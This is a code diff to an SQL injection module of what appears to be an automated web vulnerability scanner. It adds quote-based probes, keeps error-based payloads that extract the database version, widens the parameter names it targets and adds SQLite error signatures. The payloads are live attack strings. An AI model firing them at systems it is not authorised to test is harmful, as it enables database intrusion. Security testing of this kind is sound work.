@@ -28,6 +28,10 @@ class SQLiModule(AsyncBaseAttackModule):
     
     # Error-based payloads
     ERROR_PAYLOADS = [
+        "'",  # Simple quote to trigger syntax error
+        "'--",  # Quote with SQL comment
+        "')--",  # Close parenthesis with comment
+        "'))--",  # Double close parenthesis
         "' AND 1=CONVERT(int, (SELECT @@version))--",
         "' AND extractvalue(1,concat(0x7e,version()))--",
         "' AND 1=CAST((SELECT version()) AS int)--",
@@ -76,7 +80,13 @@ class SQLiModule(AsyncBaseAttackModule):
         param_value = parameter.get('value', '')
         
         # Apply to parameters that commonly interact with databases
-        sql_indicators = ['id', 'search', 'query', 'filter', 'sort', 'user', 'page', 'item']
+        sql_indicators = [
+            'id', 'search', 'query', 'filter', 'sort', 'user', 'page', 'item',
+            'q',  # Common search parameter
+            'keyword', 'term', 'find', 'name', 'email', 'username',
+            'category', 'cat', 'type', 'status', 'order', 'limit', 'offset',
+            'pid', 'uid', 'cid', 'post', 'product', 'article'
+        ]
         
         if any(indicator in param_name for indicator in sql_indicators):
             return True
@@ -266,6 +276,10 @@ class SQLiModule(AsyncBaseAttackModule):
             'Microsoft SQL',
             'ODBC SQL',
             'SQLite',
+            'SQLITE_ERROR',  # SQLite specific
+            'sqlite3.OperationalError',  # Python SQLite
+            'incomplete input',  # SQLite error
+            'unrecognized token',  # SQLite error
             'syntax error',
             'unterminated quoted string',
             'quoted string not properly terminated',
@@ -275,9 +289,12 @@ class SQLiModule(AsyncBaseAttackModule):
             'warning: pg',
             'valid MySQL result',
             'SQLSTATE',
+            'SQL error',
+            'database error',
+            'query failed',
         ]
         
-        for payload in self.ERROR_PAYLOADS[:3]:  # Test first 3
+        for payload in self.ERROR_PAYLOADS[:6]:  # Test first 6 including simple quotes
             try:
                 test_url = self._inject_payload(url, param_name, payload, param_location)
                 response = await client.get(test_url, timeout=self.timeout)
